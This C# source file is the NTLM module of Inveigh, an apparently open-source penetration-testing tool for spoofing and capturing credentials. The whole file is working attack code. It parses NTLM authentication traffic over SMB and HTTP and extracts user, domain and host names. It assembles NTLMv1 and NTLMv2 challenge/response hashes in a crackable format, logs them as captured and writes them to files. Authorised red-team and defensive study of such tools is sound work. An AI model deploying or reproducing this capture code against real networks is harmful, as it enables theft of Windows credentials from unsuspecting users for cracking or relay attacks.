using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Inveigh
{
    class NTLM
    {

        public static string GetSMBNTLMChallenge(byte[] field)
        {
            string payload = System.BitConverter.ToString(field);
            payload = payload.Replace("-", String.Empty);
            int index = payload.IndexOf("4E544C4D53535000");
            string challenge = "";

            if (index > 0 && payload.Substring((index + 16), 8) == "02000000")
            {
                challenge = payload.Substring((index + 48), 16);
                uint targetNameLength = Common.UInt16DataLength(((index + 24) / 2), field);
                int negotiateFlags = System.Convert.ToInt16((payload.Substring((index + 44), 2)), 16);
                string negotiateFlagsValues = Convert.ToString(negotiateFlags, 2);
                string targetInfoFlag = negotiateFlagsValues.Substring(0, 1);
                string netBIOSDomainName = "";
                string dnsComputerName = "";
                string dnsDomainName = "";

                if (targetInfoFlag == "1")
                {
                    int targetInfoIndex = ((index + 80) / 2) + (int)targetNameLength + 16;
                    byte targetInfoItemType = field[targetInfoIndex];
                    int i = 0;

                    while (targetInfoItemType != 0 && i < 10)
                    {
                        uint targetInfoItemLength = Common.UInt16DataLength((targetInfoIndex + 2), field);

                        switch (targetInfoItemType)
                        {
                            case 2:
                                netBIOSDomainName = Common.DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
                                break;

                            case 3:
                                dnsComputerName = Common.DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
                                break;

                            case 4:
                                dnsDomainName = Common.DataToString((targetInfoIndex + 4), (int)targetInfoItemLength, field);
                                break;
                        }

                        targetInfoIndex += (int)targetInfoItemLength + 4;
                        targetInfoItemType = field[targetInfoIndex];
                        i++;
                    }

                }

            }

            return challenge;
        }

        public static void GetNTLMResponse(byte[] field, string sourceIP, string sourcePort, string protocol, bool enabledFileOutput, bool enabledSpooferRepeat, string IP, bool enabledMachineAccounts)
        {
            string payload = System.BitConverter.ToString(field);
            payload = payload.Replace("-", String.Empty);
            string session = sourceIP + ":" + sourcePort;
            int index = payload.IndexOf("4E544C4D53535000");
            string lmResponse = "";
            string ntlmResponse = "";
            int ntlmLength = 0;
            string challenge = "";
            string domain = "";
            string user = "";
            string host = "";

            if ((protocol == "HTTP" || index > 0) && payload.Substring((index + 16), 8) == "03000000")
            {
                int ntlmsspOffset = index / 2;
                int lmLength = (int)Common.UInt16DataLength((ntlmsspOffset + 12), field);
                int lmOffset = (int)Common.UInt32DataLength((ntlmsspOffset + 16), field);
                byte[] lmPayload = new byte[lmLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + lmOffset), lmPayload, 0, lmPayload.Length);
                lmResponse = System.BitConverter.ToString(lmPayload).Replace("-", String.Empty);
                ntlmLength = (int)Common.UInt16DataLength((ntlmsspOffset + 20), field);
                int ntlmOffset = (int)Common.UInt32DataLength((ntlmsspOffset + 24), field);
                byte[] ntlmPayload = new byte[ntlmLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + ntlmOffset), ntlmPayload, 0, ntlmPayload.Length);
                ntlmResponse = System.BitConverter.ToString(ntlmPayload).Replace("-", String.Empty);
                int domainLength = (int)Common.UInt16DataLength((ntlmsspOffset + 28), field);
                int domainOffset = (int)Common.UInt32DataLength((ntlmsspOffset + 32), field);
                byte[] domainPayload = new byte[domainLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + domainOffset), domainPayload, 0, domainPayload.Length);
                domain = Common.DataToString((ntlmsspOffset + domainOffset), domainLength, field);
                int userLength = (int)Common.UInt16DataLength((ntlmsspOffset + 36), field);
                int userOffset = (int)Common.UInt32DataLength((ntlmsspOffset + 40), field);
                byte[] userPayload = new byte[userLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + userOffset), userPayload, 0, userPayload.Length);
                user = Common.DataToString((ntlmsspOffset + userOffset), userLength, field);
                int hostLength = (int)Common.UInt16DataLength((ntlmsspOffset + 44), field);
                int hostOffset = (int)Common.UInt32DataLength((ntlmsspOffset + 48), field);
                byte[] hostPayload = new byte[hostLength];
                System.Buffer.BlockCopy(field, (ntlmsspOffset + hostOffset), hostPayload, 0, hostPayload.Length);
                host = Common.DataToString((ntlmsspOffset + hostOffset), hostLength, field);

                if (protocol == "SMB")
                {
                    challenge = Program.smbSessionTable[session].ToString();
                }
                else if (protocol == "HTTP")
                {
                    challenge = Program.httpSessionTable[session].ToString();
                }

                if (ntlmLength > 24)
                {
                    string ntlmV2Hash = user + "::" + domain + ":" + challenge + ":" + ntlmResponse.Insert(32, ":");

                    lock (Program.outputList)
                    {

                        if (enabledMachineAccounts || (!enabledMachineAccounts && !user.EndsWith("$")))
                        {

                            if (Program.ntlmv2UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user)))
                            {
                                Program.outputList.Add(String.Format("[+] {0} {1} NTLMv2 challenge/response captured from {2}({3}):{4}{5}", DateTime.Now.ToString("s"), protocol, sourceIP, host, System.Environment.NewLine, "[not unique]"));
                            }
                            else
                            {
                                Program.outputList.Add(String.Format("[+] {0} {1} NTLMv2 challenge/response captured from {2}({3}):{4}{5}", DateTime.Now.ToString("s"), protocol, sourceIP, host, System.Environment.NewLine, ntlmV2Hash));

                                lock (Program.ntlmv2UsernameList)
                                {
                                    Program.ntlmv2UsernameList.Add(String.Concat(sourceIP, " ", domain, "\\", user));
                                }

                            }

                            if (enabledFileOutput)
                            {

                                lock (Program.ntlmv2FileList)
                                {
                                    Program.ntlmv2FileList.Add(ntlmV2Hash);
                                }

                                Program.outputList.Add(String.Format("[!] {0} {1} NTLMv2 challenge/response written to Inveigh-NTLMv2.txt", DateTime.Now.ToString("s"), protocol));
                            }

                        }
                        else
                        {
                            Program.outputList.Add(String.Format("[+] {0} {1} NTLMv2 challenge/response ignored from {2}({3}):{4}{5}", DateTime.Now.ToString("s"), protocol, sourceIP, host, System.Environment.NewLine, "[machine account]"));
                        }

                    }

                    Program.ntlmv2List.Add(ntlmV2Hash);

                    if (!Program.ipCaptureList.Contains(sourceIP) && !user.EndsWith("$") && !enabledSpooferRepeat && !String.Equals(sourceIP, IP))
                    {
                        Program.ipCaptureList.Add(sourceIP);
                    }

                }
                else if (ntlmLength == 24)
                {
                    string ntlmV1Hash = user + "::" + domain + ":" + lmResponse + ":" + ntlmResponse + ":" + challenge;

                    lock (Program.outputList)
                    {

                        if (enabledMachineAccounts || (!enabledMachineAccounts && !user.EndsWith("$")))
                        {

                            if (Program.ntlmv1UsernameList.Contains(String.Concat(sourceIP, " ", domain, "\\", user)))
                            {
                                Program.outputList.Add(String.Format("[+] {0} {1} NTLMv1 challenge/response captured from {2}({3}):{4}{5}", DateTime.Now.ToString("s"), protocol, sourceIP, host, System.Environment.NewLine, "[not unique]"));
                            }
                            else
                            {
                                Program.outputList.Add(String.Format("[+] {0} {1} NTLMv1 challenge/response captured from {2}({3}):{4}{5}", DateTime.Now.ToString("s"), protocol, sourceIP, host, System.Environment.NewLine, ntlmV1Hash));

                                lock (Program.ntlmv1UsernameList)
                                {
                                    Program.ntlmv1UsernameList.Add(String.Concat(sourceIP, " ", domain, "\\", user));
                                }

                            }

                            if (enabledFileOutput)
                            {

                                lock (Program.ntlmv1FileList)
                                {
                                    Program.ntlmv1FileList.Add(ntlmV1Hash);
                                }

                                Program.outputList.Add(String.Format("[!] {0} {1} NTLMv1 challenge/response written to Inveigh-NTLMv1.txt", DateTime.Now.ToString("s"), protocol));
                            }

                            Program.ntlmv1List.Add(ntlmV1Hash);

                        }
                        else
                        {
                            Program.outputList.Add(String.Format("[+] {0} {1} NTLMv1 challenge/response ignored from {2}({3}):{4}{5}", DateTime.Now.ToString("s"), protocol, sourceIP, host, System.Environment.NewLine, "[machine account]"));
                        }

                    }

                    if (!Program.ipCaptureList.Contains(sourceIP) && !user.EndsWith("$") && !enabledSpooferRepeat && !String.Equals(sourceIP, IP))
                    {
                        Program.ipCaptureList.Add(sourceIP);
                    }

                    if (enabledFileOutput)
                    {
                        
                    }

                }

            }

        }

    }

}
